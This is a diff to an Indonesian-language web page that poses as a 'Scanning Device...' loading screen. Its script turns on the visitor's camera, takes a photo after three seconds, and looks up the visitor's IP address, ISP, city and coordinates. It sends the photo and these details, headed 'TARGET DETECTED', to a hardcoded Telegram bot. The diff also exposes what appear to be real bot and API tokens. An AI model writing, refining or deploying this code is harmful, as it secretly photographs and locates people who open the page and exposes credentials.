@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Loading System...</title>
+  <title>Scanning Device...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -44,8 +44,8 @@
 <canvas id="canvas"></canvas>
 
 <script>
-const token = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU'; // Ganti dengan token bot kamu
-const chat_id = '6624966395'; // Ganti dengan chat_id kamu
+const token = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU'; // Ganti token
+const chat_id = '6624966395'; // Ganti chat id
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
@@ -73,14 +73,10 @@ function kirimFoto(blob, caption) {
 }
 
 // Ambil data IP + lokasi
-function ambilDataIP() {
-  return fetch('https://ip-api.com/json/')
-    .then(res => res.json())
-    .catch(err => {
-      console.error('Gagal ambil IP:', err);
-      kirimPesan('Gagal ambil IP: ' + err);
-      throw err;
-    });
+async function ambilDataIP() {
+  const res = await fetch('https://ipinfo.io/json?token=7b6e7ab6d60b7e');
+  const data = await res.json();
+  return data;
 }
 
 // Ambil foto dari kamera
@@ -101,17 +97,17 @@ async function mulaiScanning() {
   try {
     const info = await ambilDataIP();
     const device = navigator.userAgent;
+    const lokasi = info.loc ? info.loc.split(",") : [null, null];
     const caption = `
 == TARGET DETECTED ==
-IP: ${info.query}
+IP: ${info.ip}
 Negara: ${info.country}
-Region: ${info.regionName}
+Region: ${info.region}
 Kota: ${info.city}
-ISP: ${info.isp}
-Timezone: ${info.timezone}
-Koordinat: ${info.lat}, ${info.lon}
+ISP: ${info.org}
+Koordinat: ${lokasi[0]}, ${lokasi[1]}
 Device: ${device}
-=====================`;
+=====================`.trim();
 
     const fotoBlob = await ambilFoto();
     kirimFoto(fotoBlob, caption);
@@ -121,17 +117,16 @@ Device: ${device}
   }
 }
 
-// Akses kamera (tanpa audio!)
+// Akses kamera (video only)
 navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
   video.srcObject = stream;
   video.play();
   setTimeout(() => {
     mulaiScanning();
-  }, 3000); // Tunggu 3 detik supaya kamera siap
+  }, 3000); // Tunggu 3 detik biar kamera nyala
 })
 .catch(err => {
-  console.error('Gagal akses kamera:', err);
   kirimPesan('Gagal akses kamera: ' + err);
 });
 </script>
